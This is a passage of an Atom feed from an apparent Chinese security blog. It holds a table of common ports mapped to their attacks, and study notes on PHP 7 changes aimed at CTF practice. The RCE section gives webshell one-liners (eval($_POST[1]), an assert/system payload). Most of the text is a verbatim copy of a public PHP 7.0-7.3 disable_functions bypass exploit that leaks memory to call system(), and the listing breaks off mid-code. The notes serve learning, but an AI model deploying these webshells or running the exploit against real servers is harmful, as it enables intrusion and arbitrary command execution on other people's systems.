<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>可惜没如果、m0nk3y‘s Blog</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-08-25T16:31:13.691Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>常见端口服务漏洞</title>
    <link href="https://hack-for.fun/e42fccb.html"/>
    <id>https://hack-for.fun/e42fccb.html</id>
    <published>2020-08-25T16:27:28.000Z</published>
    <updated>2020-08-25T16:31:13.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="列举"><a href="#列举" class="headerlink" title="列举"></a>列举</h1><p>21    ftp/tftp/vsftpd文件传输协议    爆破/嗅探/溢出/后门<br>22    ssh远程连接    爆破/openssh漏洞<br>23    Telnet远程连接    爆破/嗅探/弱口令<br>25    SMTP邮件服务    邮件伪造<br>53    DNS域名解析系统    域传送/劫持/缓存投毒/欺骗<br>81    Ipcam    登陆绕过/远程代码执行<br>110    pop3    爆破/嗅探<br>139    Samba服务    爆破/未授权访问/远程命令执行<br>143    Imap协议    爆破<br>389    Ldap目录访问协议    注入/未授权访问/弱口令<br>445    smb    ms17-010/端口溢出<br>873    Rsync服务    文件上传/未授权访问<br>1080    socket    爆破<br>1352    Lotus      domino邮件服务    爆破/信息泄漏<br>1433    mssql    爆破/注入/SA弱口令<br>1521    oracle    爆破/注入/TNS爆破/反弹shell<br>2049    Nfs服务    配置不当<br>2181    zookeeper服务    未授权访问<br>2375    docker      remote      api    未授权访问<br>3306    mysql    爆破/注入<br>3389    Rdp远程桌面链接    爆破/shift后门<br>4440    rundeck    弱口令admin<br>4848    GlassFish控制台    爆破/认证绕过<br>5000    sybase/DB2数据库    爆破/注入/提权<br>5432    postgresql    爆破/注入/缓冲区溢出<br>5632    pcanywhere服务    抓密码/代码执行<br>5900    vnc    爆破/认证绕过<br>6082    varnish    Varnish      HTTP      accelerator      CLI      未授权访问<br>6379    Redis数据库    未授权访问/爆破<br>67/68    dhcp服务    劫持/欺骗<br>8082    H2数据库    弱口令/空口令<br>8161    activemq    弱口令/写文件<br>8649    ganglia    信息泄漏<br>9000    fastcgi    远程命令执行<br>9090    Websphere控制台/用友    爆破/java反序列化/弱口令<br>11211    memcached    未授权访问<br>50000    SAP    SAP命令执行<br>80/443    http/https    web应用漏洞/心脏滴血<br>161：162    SNMP协议    爆破/搜集目标内网信息<br>2601:2604    zebra路由软件    默认密码zebra<br>3128：3312    squid    远程代码执行<br>7001/7002    weblogic    java反序列化/控制台弱口令<br>8083/8086    influxDB    未授权访问<br>9200/9300    elasticsearch    远程代码执行<br>512/513/514    Linux      Rexec服务    爆破/Rlogin登陆<br>61616/8161    ActiveMQ    未授权访问/默认密码/反序列化<br>8069/10050    zabbix服务    远程命令执行/注入<br>8000/8080/8089    Jboss/Tomcat/Resin    爆破/PUT文件上传/反序列化<br>27017/27018/28017    mongodb    未授权访问/爆破<br>8080/8088/50060:50070    hadoop    默认端口未授权访问</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>等我有空，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;列举&quot;&gt;&lt;a href=&quot;#列举&quot; class=&quot;headerlink&quot; title=&quot;列举&quot;&gt;&lt;/a&gt;列举&lt;/h1&gt;&lt;p&gt;21    ftp/tftp/vsftpd文件传输协议    爆破/嗅探/溢出/后门&lt;br&gt;22    ssh远程连接    爆破/open</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="第三方漏洞" scheme="https://hack-for.fun/tags/%E7%AC%AC%E4%B8%89%E6%96%B9%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>PHP以及MYSQL相关版本差异及对应的安全问</title>
    <link href="https://hack-for.fun/d8714939.html"/>
    <id>https://hack-for.fun/d8714939.html</id>
    <published>2020-08-25T15:53:12.000Z</published>
    <updated>2020-08-25T17:08:16.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直觉得自己对相关的漏洞学的马马虎虎，没有深入总结，最近几次CTF比赛中也吃了不少的亏。遂想花一两天的时间来好好总结一下各个版本之间的区别，漏洞利用方式的不同，于是有了这篇文章。</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>PHP 现在应该一般都升级为<strong>php7</strong>了吧，所以来学习一波php7的新特性。</p><p>主要是参考这篇文章：<a href="http://www.php7.site/book/php7/variable-changes-22.html#0">http://www.php7.site/book/php7/variable-changes-22.html#0</a></p><h2 id="变量处理机制"><a href="#变量处理机制" class="headerlink" title="变量处理机制"></a>变量处理机制</h2><ul><li>间接变量，属性和方法引用都按照 <strong>从作到右</strong>到顺序进行解释（如果想要改变顺序，可以使用大括号</li><li>global 关键字只能引用简单变量</li><li>无法将一个函数作为另一个函数的参数进行传递</li><li>引用赋值时自动创建数组元素或者对象属性顺序不同</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$array = [];</span><br><span class="line">$array[<span class="string">&quot;a&quot;</span>] =&amp; $array[<span class="string">&quot;b&quot;</span>];</span><br><span class="line">$array[<span class="string">&quot;b&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">var_dump($array);</span><br><span class="line">PHP7产生的数组：[<span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="number">1</span>]</span><br><span class="line">PHP5产生的数组：[<span class="string">&quot;b&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h2 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h2><ul><li><code>list()</code> 按照顺序进行取值。</li><li>对一个空的list()赋值不再允许</li><li>list() 不再具有拆分功能</li></ul><h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach()"></a>foreach()</h2><ul><li>foreach循环对数组内部指针不再起作用</li><li>foreach进行by-value循环时，是对该数组的拷贝操作，如果对其进行修改也没有影响</li><li>按照引用进行循环时，对数组进行修改就会有影响</li></ul><h2 id="参数处理机制"><a href="#参数处理机制" class="headerlink" title="参数处理机制"></a>参数处理机制</h2><ul><li>不再支持重复参数名（也没人这样用</li><li>Func_get_arg 和 func_get_args，这两个方法返回参数当前的值，而不是传入时的值</li><li>PHP7 报错的时候，也是报当前值</li></ul><h2 id="整数处理机制修改"><a href="#整数处理机制修改" class="headerlink" title="整数处理机制修改"></a>整数处理机制修改</h2><ul><li>无效的8进制数会编译报错，而老版本会忽略无效的数字</li><li>位移负的位置会产生异常 ArithmeticError: Bit shift by negative number</li><li>左位移如果超出位数返回 <code>0</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">1</span> &lt;&lt; <span class="number">64</span>);</span><br></pre></td></tr></table></figure><ul><li>右移如果超出位数返沪0或-1</li></ul><h2 id="字符串处理机制修改"><a href="#字符串处理机制修改" class="headerlink" title="字符串处理机制修改"></a>字符串处理机制修改</h2><ul><li>含有16进制的字符串不再视为数字，也不区别对待。这个就会涉及到一些绕过了。</li><li><code>\u&#123;</code> 后面如果包含非法字符会报错</li></ul><h2 id="其他修改"><a href="#其他修改" class="headerlink" title="其他修改"></a>其他修改</h2><ul><li>CURL模块：禁止禁用CURLOPT_SAFE_UPLOAD选项，通过curl上传文件必须使用curl_file/CURLFILE接口。</li><li>DATE模块：mktime()和gmmktime()函数移除了$is_dst parameter参数。</li><li>DBA模块：dba_delete() 如果在inifile里面没有找到key的时候会返回false。</li><li>GMP模块：必须用libgmp 4.2版本以上。gmp_setbit() and gmp_clrbit()如果传入的index为负数的话，会返回false。</li><li>Intl模块：移除了别名函数datefmt_set_timezone_id() 和IntlDateFormatter::setTimeZoneID()，用datefmt_set_timezone() 和IntlDateFormatter::setTimeZone()</li><li><strong>libxml模块：新增ibxml 2.9.0引入的LIBXML_BIGLINES 选项，并在错误报告中增加了行号&gt; 16-bit的支持。</strong></li><li>Mcrypt模块：.移除了mcrypt_generic_end() mcrypt_ecb(), mcrypt_cbc(), mcrypt_cfb() 和mcrypt_ofb()</li><li>Opcache：移除了opcache.load_comments配置项，现在注释加载总是被激活的。</li><li>OpenSSL：移除了”rsa_key_size”、”CN_match” 、”SNI_server_name” 选项。</li><li><strong>PCRE：移除了 /e (PREG_REPLACE_EVAL) 修饰符的支持，使用preg_replace_callback()来代替。</strong></li><li>PDO_pgsql：删除了PGSQL_ATTR_DISABLE_NATIVE_PREPARED_STATEMENT选项。</li><li>Standard：删除了setlocale()函数里面对字符串类型的支持，使用LC_*常量。删除了set_magic_quotes_runtime() magic_quotes_runtime().</li><li>JSON：json_decode()会拒绝与RFC 7159不兼容的数字格式。json_decode第一个参数是空值的时候会返回json语法错误。</li><li>Stream：删除别名函数set_socket_blocking()</li><li>XSL：删除xsl.security_prefs 选项。</li><li>session<ul><li>session_start()可以接受所有的INI设置，可以用数组的方式传入，比如：[‘cache_limiter’=&gt;’private’]</li><li>save handler接受validate_sid(), update_timestamp() ，可用来检查sid是否存在，更新session数据的时间戳。</li><li>增加了SessionUpdateTimestampHandlerInterface，这个接口里面定义了validateSid(), updateTimestamp()方法。</li><li>session.lazy_write(default=On) 配置项可以允许只有session数据有变化时才写数据。</li></ul></li></ul><p>。。。。。。</p><p>以及其他特性。</p><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p><a href="https://www.cc1021.com/article/134.html">https://www.cc1021.com/article/134.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>Eval 把其中的字符串当做PHP代码进行执行。所有语句必须以分号结束。</p><blockquote><p>函数*<em>eval()**语言结构是 <em>非常危险\</em>的， 因为它允许执行任意 PHP 代码。 \</em>它这样用是很危险的。* 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，<em>不要允许传入任何由用户 提供的、未经完整验证过的数据</em> 。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">    $_POST[<span class="number">1</span>]($_POST[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 传入：1=assert&amp;2=system(&#x27;ls&#x27;)</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">  <span class="comment">// short_open_tag=On</span></span><br></pre></td></tr></table></figure><p>eval 是一个语言构造器，而不是一个函数。不能被可变 函数调用。</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>检查一个断言是否为FALSE。</p><p>PHP 5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="keyword">string</span> $description ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>PHP 7:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">Throwable</span> $exception ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>如果<code>assertion</code> 为字符串，那么会被当做php 代码来执行。<strong>在PHP 7 中，变为语言结构而不是函数，即不能像eval那样支持可变函数了。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_POST[<span class="number">1</span>]($_POST[<span class="number">2</span>]); <span class="comment">// 在php7 中无法使用1=assert&amp;2=system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p>eval其实是Zend引擎到函数，而assert是PHP_FUNCTION 宏编写的，调用不同。</p><p><a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a></p><p><a href="https://www.anquanke.com/post/id/173201">https://www.anquanke.com/post/id/173201</a></p><h3 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h3><h4 id="Php-7-0-7-3-bypass"><a href="#Php-7-0-7-3-bypass" class="headerlink" title="Php 7.0-7.3 bypass"></a>Php 7.0-7.3 bypass</h4><p>:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span 